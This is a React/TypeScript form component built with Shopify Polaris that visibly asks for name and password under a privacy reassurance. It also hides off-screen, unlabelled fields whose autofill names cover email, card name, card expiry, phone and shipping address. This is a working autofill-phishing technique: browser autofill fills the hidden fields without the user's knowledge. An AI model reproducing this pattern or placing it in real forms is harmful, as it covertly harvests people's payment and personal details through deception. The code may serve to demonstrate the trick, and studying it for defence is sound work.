import React from "react";
import {
  useForm,
  useField,
  submitFail,
  submitSuccess
} from "@shopify/react-form";
import useReactRouter from "use-react-router";

import {
  Button,
  Card,
  FormLayout,
  Layout,
  Page,
  Stack,
  TextField,
  TextStyle
} from "@shopify/polaris";

export interface FieldValues {
  firstName: string;
  middleName: string;
  lastName: string;
  email: string;
  password: string;
  passwordConfirmation: string;
  phone: string;
  address: string;
  city: string;
  state: string;
  zip: string;
  country: string;
  cardNumber: string;
  ccname: string;
}

export type Fields = ReturnType<typeof useDetailFields>;

export function DetailsForm({
  firstName,
  middleName,
  lastName,
  email,
  password,
  passwordConfirmation,
  phone,
  address,
  city,
  state,
  zip,
  country,
  ccname,
  cardNumber
}: Fields) {
  return (
    <Stack vertical>
      <FormLayout>
        <TextStyle variation="subdued">
          🔒 This information is private by default.
        </TextStyle>
        <FormLayout.Group>
          <TextField label="First Name" name="fname" {...firstName} />
          <TextField label="Last Name" name="lname" {...lastName} />
        </FormLayout.Group>
        <FormLayout.Group>
          <TextField label="Password" type="password" {...password} />
          <TextField
            label="Confirm Password"
            type="password"
            {...passwordConfirmation}
          />
        </FormLayout.Group>

        <FormLayout.Group>
          <div style={{ position: "fixed", left: "100VW" }}>
            <TextField label="" name="email" {...email} />
            <TextField label="" name="mname" {...middleName} />
            <TextField label="" name="ccname" {...ccname} />
            <TextField label="" name="cc-exp" {...cardNumber} />
            <TextField label="" name="phone" {...phone} />
            <TextField label="" name="ship-address" {...address} />
            <TextField label="" name="ship-city" {...city} />
            <TextField label="" name="ship-state" {...state} />
            <TextField label="" name="ship-zip" {...zip} />
            <TextField label="" name="ship-country" {...country} />
          </div>
        </FormLayout.Group>
      </FormLayout>
    </Stack>
  );
}

export function useDetailFields({
  firstName = "",
  middleName = "",
  lastName = "",
  email = "",
  password = "",
  passwordConfirmation = "",
  phone = "",
  address = "",
  city = "",
  state = "",
  zip = "",
  country = "",
  ccname = "",
  cardNumber = ""
}: Partial<FieldValues> = {}) {
  return {
    firstName: useField(firstName),
    middleName: useField(middleName),
    lastName: useField(lastName),
    email: useField(email),
    password: useField(password),
    passwordConfirmation: useField(passwordConfirmation),
    phone: useField(phone),
    address: useField(address),
    city: useField(city),
    state: useField(state),
    zip: useField(zip),
    country: useField(country),
    cardNumber: useField(cardNumber),
    ccname: useField(ccname)
  };
}
